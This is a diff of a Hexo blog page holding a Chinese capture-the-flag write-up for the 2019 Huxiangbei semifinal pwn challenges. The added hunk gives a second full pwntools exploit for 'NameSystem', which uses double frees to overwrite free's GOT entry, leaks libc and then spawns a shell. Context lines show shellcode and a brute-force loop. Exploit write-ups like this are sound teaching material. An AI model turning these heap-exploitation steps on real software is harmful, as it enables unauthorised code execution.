@@ -11,14 +11,14 @@
 
   <link rel="shortcut icon" href="/home.png" type="image/png">
   <meta name="description" content="湖湘杯2019复赛pwn题的解题过程">
-<meta name="keywords" content="pwn,ctf">
+<meta name="keywords" content="ctf,pwn">
 <meta property="og:type" content="article">
 <meta property="og:title" content="湖湘杯2019复赛 pwn Writeup">
 <meta property="og:url" content="http://shiroinu.top/2019/11/09/hxb2019pwn/index.html">
 <meta property="og:site_name" content="thatshaman&#39;s site">
 <meta property="og:description" content="湖湘杯2019复赛pwn题的解题过程">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-11-09T13:54:49.846Z">
+<meta property="og:updated_time" content="2019-11-17T07:54:38.246Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="湖湘杯2019复赛 pwn Writeup">
 <meta name="twitter:description" content="湖湘杯2019复赛pwn题的解题过程">
@@ -28,7 +28,7 @@
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
   
   <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
-  <link rel="stylesheet" href="/css/style.css?v=1573356695769">
+  <link rel="stylesheet" href="/css/style.css?v=1573978293350">
 </head>
 
 <body class="mdui-drawer-body-left">
@@ -42,7 +42,7 @@
         </a>
     </div>
     <div class="nexmoe-count">
-        <div><span>文章</span>11</div>
+        <div><span>文章</span>12</div>
         <div><span>标签</span>2</div>
         <div><span>分类</span>0</div>
     </div>
@@ -162,8 +162,8 @@
     </div>
   <div class="nexmoe-post-meta">
     <a><i class="nexmoefont icon-calendar-fill"></i>2019年11月09日</a>
-    <a><i class="nexmoefont icon-areachart"></i>979 字</a>
-    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 5 分钟</a>
+    <a><i class="nexmoefont icon-areachart"></i>1.5k 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 8 分钟</a>
     
     
       <a class="nexmoefont icon-tag-fill -link" href="/tags/ctf/">ctf</a> <a class="nexmoefont icon-tag-fill -link" href="/tags/pwn/">pwn</a>
@@ -238,7 +238,7 @@ add(0x40, p64(0x6cb790) + asm(shellcraft.sh()) ) #malloc()三次是因为之前�
 sh.sendline(&#39;1&#39;)
 sh.sendlineafter(&quot;Input the Size:&quot;, &#39;64&#39;)
 sh.interactive()</code></pre>
-<h1 id="NameSystem"><a href="#NameSystem" class="headerlink" title="NameSystem"></a>NameSystem</h1><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>利用doublefree获取 got表 0x60200a 这一地址的fake_chunk,然后修改free()的got表低四位为system()的0x5390 ,然后free()之前申请的内容为<code>/bin/sh</code>的chunk,若地址正确是就相当于<code>system(&#39;/bin/sh&#39;)</code>然后爆破三位获取shell</p>
+<h1 id="NameSystem"><a href="#NameSystem" class="headerlink" title="NameSystem"></a>NameSystem</h1><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>利用doublefree获取 got表 0x60200a 这一地址的fake_chunk,然后修改free()的got表低四位为system()的0x5390 ,然后free()之前申请的内容为<code>/bin/sh</code>的chunk,若地址正确是就相当于<code>system(&#39;/bin/sh&#39;)</code>然后爆破三位获取shell</p>
 <h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *
 #context.log_level =&#39;DEBUG&#39;
 
@@ -291,6 +291,84 @@ while (1):
         continue
     else:
         sh.interactive()</code></pre>
+<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>先将<code>ptr[0]</code>修改为got表地址用于泄露libc地址，然后修改<code>free_got</code>为<code>puts_plt</code>，这样在<code>delete(0)</code>时就能得到libc地址,同时需要在got表段留下<code>size = 0x41</code>的fake_size用于再次修改<code>free_got</code>为<code>system</code>,此时delete()内容为<code>/bin/sh</code>的chunk就能getshell</p>
+<h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">#encoding:utf-8
+from pwn import *
+from LibcSearcher import LibcSearcher
+context.log_level =&#39;DEBUG&#39;
+def add(size, content):
+    sh.sendline(&#39;1&#39;)
+    sh.recvuntil(&#39;Name Size:&#39;)
+    sh.sendline(str(size))
+    sh.recvuntil(&#39;Name:&#39;)
+    sh.sendline(content)
+    sh.recvuntil(&#39;Your choice :&#39;)
+def delete(index):
+    sh.sendline(&#39;3&#39;)
+    sh.recvuntil(&#39;The id you want to delete:&#39;)
+    sh.sendline(str(index))
+    sh.recvuntil(&#39;Your choice :&#39;)
+sh = process(&#39;./NameSystem&#39;)
+sh.recvuntil(&#39;Your choice :&#39;)
+for i in range(18):
+    add(0x40,&#39;aaa&#39;)</code></pre>
+<pre><code class="python">#gdb.attach(sh)
+#三次double free
+add(0x50,&#39;bbb&#39;)
+add(0x50,&#39;ccc&#39;)
+delete(0)
+delete(18)
+delete(17)
+delete(19)
+delete(0)
+add(0x60,&#39;ddd&#39;)
+add(0x60,&#39;eee&#39;)
+delete(0)
+delete(18)
+delete(17)
+delete(19)
+delete(0)
+add(0x30,&#39;fff&#39;)
+add(0x30,&#39;ggg&#39;)
+delete(0)    
+delete(18)
+delete(17)
+delete(19)
+delete(0)
+for i in range(12):
+    delete(0)
+#令ptr[0] = 0x602060 即atoi_got 用于待会的puts libc地址
+add(0x60,p64(0x60208d))
+add(0x60,p64(0))
+add(0x60,&#39;/bin/sh\x00&#39;) # 此处/bin/sh没有特别意义
+add(0x60,&#39;\x00&#39;*3 + p64(0x602060)) </code></pre>
+<pre><code class="python">#修改free_got 为 puts_plt 
+add(0x50,p64(0x601ffa))
+add(0x50,p64(0))
+add(0x50,&#39;/bin/sh\x00&#39;)
+add(0x50,&#39;\x00&#39; * 0x6 + p64(0x41) + p32(0x4006a0) + &#39;\x00&#39; *3 ) 
+# &#39;\x00&#39; * 0x6 + p64(0x41) 是加起来长度0xe的 padding 0x41 是为了等会再次修改free_got时malloc(0x30)留下的fake_chunk_size 
+# p32(0x4006a0) + &#39;\x00&#39; *3 再加上会被readin()修改为&#39;\x00&#39;的&#39;\n&#39; 一共8字节 如果用p64(0x4006a0) 会越界一字节导致报错
+sh.sendline(&#39;3&#39;)
+sh.recvuntil(&#39;The id you want to delete:&#39;)
+sh.sendline(&#39;0&#39;)
+atoi_addr = u64(sh.recvuntil(&#39;\n&#39;)[:-1].ljust(8,&#39;\x00&#39;))
+
+libc = LibcSearcher(&#39;atoi&#39;,atoi_addr)
+libc_base = atoi_addr - libc.dump(&#39;atoi&#39;)
+log.info(&#39;libc_base = &#39; + hex(libc_base))
+system_addr = libc_base + libc.dump(&#39;system&#39;)
+#泄露libc地址
+add(0x30, p64(0x602008))
+add(0x30,p64(0))
+add(0x30,&#39;/bin/sh\x00&#39;)
+add(0x30,p64(system_addr)[:7] )
+#再次修改free_got为system_addr [:7] 也是防止越界
+sh.sendline(&#39;3&#39;)
+sh.recvuntil(&#39;The id you want to delete:&#39;)
+sh.sendline(&#39;15&#39;)
+
+sh.interactive()</code></pre>
 
   </article>
   <section class="nexmoe-comment">
@@ -325,7 +403,7 @@ while (1):
 <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
 <script>hljs.initHighlightingOnLoad();</script>
 
-<script src="/js/app.js?v=1573356695591"></script>
+<script src="/js/app.js?v=1573978293304"></script>
 <script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
 
   
